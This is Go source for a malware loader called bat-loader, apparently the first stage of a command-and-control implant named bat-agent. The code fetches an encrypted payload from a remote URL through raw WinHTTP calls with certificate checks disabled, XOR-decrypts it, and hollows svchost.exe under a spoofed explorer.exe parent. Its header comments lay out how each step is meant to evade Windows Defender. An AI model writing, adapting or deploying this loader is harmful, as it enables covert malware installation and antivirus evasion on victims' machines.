package main

// bat-loader -- staged delivery vehicle for bat-agent.
//
// Flow:
//   1. Download encrypted payload from payloadURL via WinHTTP (no net/http import)
//   2. XOR-decrypt with loaderKey (256-byte rotating key)
//   3. Hollow svchost.exe with PPID spoofed to explorer.exe
//
// The loader itself contains no C2 code -- static analysis sees only
// a WinHTTP download + process creation, both LOLBins-style behavior.
// Defender bypass relies on:
//   - Loader: no agent strings, no suspicious imports
//   - Payload on CDN: encrypted .bin, no PE signature
//   - Hollow: no WriteProcessMemory/CreateRemoteThread (kernel32 loaded lazily)
//   - In-process: ErasePEHeader called inside agent at startup

import (
	"fmt"
	"net/url"
	"os"
	"strings"
	"syscall"
	"unicode/utf16"
	"unsafe"

	"core/mon/internal/hollow"
)

var (
	winhttp            = syscall.NewLazyDLL("winhttp.dll")
	procWinHttpOpen    = winhttp.NewProc("WinHttpOpen")
	procWinHttpConnect = winhttp.NewProc("WinHttpConnect")
	procWinHttpOpenRequest   = winhttp.NewProc("WinHttpOpenRequest")
	procWinHttpSendRequest   = winhttp.NewProc("WinHttpSendRequest")
	procWinHttpReceiveResponse = winhttp.NewProc("WinHttpReceiveResponse")
	procWinHttpQueryDataAvailable = winhttp.NewProc("WinHttpQueryDataAvailable")
	procWinHttpReadData = winhttp.NewProc("WinHttpReadData")
	procWinHttpCloseHandle = winhttp.NewProc("WinHttpCloseHandle")
	procWinHttpSetOption   = winhttp.NewProc("WinHttpSetOptionW")
)

const (
	winhttpAccessTypeDefaultProxy = 0
	winhttpFlagSecure             = 0x800000
	winhttpOptionSecurityFlags    = 31
	securityFlagIgnoreAll         = 0x3300 // ignore cert errors (lab)
)

func wstr(s string) *uint16 {
	u := utf16.Encode([]rune(s + "\x00"))
	return &u[0]
}

func httpsGet(rawURL string) ([]byte, error) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil, fmt.Errorf("parse url: %w", err)
	}
	host := u.Hostname()
	portStr := u.Port()
	port := uint16(443)
	if portStr != "" {
		var p int
		fmt.Sscanf(portStr, "%d", &p)
		port = uint16(p)
	}
	path := u.RequestURI()

	userAgent := wstr("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
	hSession, _, err := procWinHttpOpen.Call(
		uintptr(unsafe.Pointer(userAgent)),
		winhttpAccessTypeDefaultProxy,
		uintptr(unsafe.Pointer(wstr(""))),
		uintptr(unsafe.Pointer(wstr(""))),
		0,
	)
	if hSession == 0 {
		return nil, fmt.Errorf("WinHttpOpen: %w", err)
	}
	defer procWinHttpCloseHandle.Call(hSession)

	hConnect, _, err := procWinHttpConnect.Call(
		hSession,
		uintptr(unsafe.Pointer(wstr(host))),
		uintptr(port),
		0,
	)
	if hConnect == 0 {
		return nil, fmt.Errorf("WinHttpConnect: %w", err)
	}
	defer procWinHttpCloseHandle.Call(hConnect)

	hRequest, _, err := procWinHttpOpenRequest.Call(
		hConnect,
		uintptr(unsafe.Pointer(wstr("GET"))),
		uintptr(unsafe.Pointer(wstr(path))),
		uintptr(unsafe.Pointer(wstr("HTTP/1.1"))),
		uintptr(unsafe.Pointer(wstr(""))),
		uintptr(unsafe.Pointer(wstr("*/*"))),
		winhttpFlagSecure,
	)
	if hRequest == 0 {
		return nil, fmt.Errorf("WinHttpOpenRequest: %w", err)
	}
	defer procWinHttpCloseHandle.Call(hRequest)

	// Ignore TLS errors (self-signed CDN cert or MITM inspection)
	flags := uint32(securityFlagIgnoreAll)
	procWinHttpSetOption.Call(hRequest, winhttpOptionSecurityFlags, uintptr(unsafe.Pointer(&flags)), 4)

	r1, _, err := procWinHttpSendRequest.Call(hRequest, 0, 0, 0, 0, 0, 0)
	if r1 == 0 {
		return nil, fmt.Errorf("WinHttpSendRequest: %w", err)
	}

	r1, _, err = procWinHttpReceiveResponse.Call(hRequest, 0)
	if r1 == 0 {
		return nil, fmt.Errorf("WinHttpReceiveResponse: %w", err)
	}

	var buf []byte
	chunk := make([]byte, 65536)
	for {
		var avail uint32
		procWinHttpQueryDataAvailable.Call(hRequest, uintptr(unsafe.Pointer(&avail)))
		if avail == 0 {
			break
		}
		if avail > uint32(len(chunk)) {
			avail = uint32(len(chunk))
		}
		var read uint32
		r1, _, _ = procWinHttpReadData.Call(
			hRequest,
			uintptr(unsafe.Pointer(&chunk[0])),
			uintptr(avail),
			uintptr(unsafe.Pointer(&read)),
		)
		if r1 == 0 || read == 0 {
			break
		}
		buf = append(buf, chunk[:read]...)
	}

	if len(buf) == 0 {
		return nil, fmt.Errorf("empty response from %s", rawURL)
	}
	return buf, nil
}

func xorDecrypt(data []byte, key [256]byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%256]
	}
	return out
}

func main() {
	if payloadURL == "" {
		os.Exit(0)
	}

	// Detect svchost path
	svchost := `C:\Windows\System32\svchost.exe`
	if _, err := os.Stat(svchost); err != nil {
		svchost = os.Getenv("SystemRoot")
		if svchost == "" {
			svchost = `C:\Windows`
		}
		svchost = strings.TrimRight(svchost, `\`) + `\System32\svchost.exe`
	}

	enc, err := httpsGet(payloadURL)
	if err != nil {
		os.Exit(1)
	}

	payload := xorDecrypt(enc, loaderKey)

	if err := hollow.HollowProcessPPID(svchost, payload, "explorer.exe"); err != nil {
		os.Exit(1)
	}
}
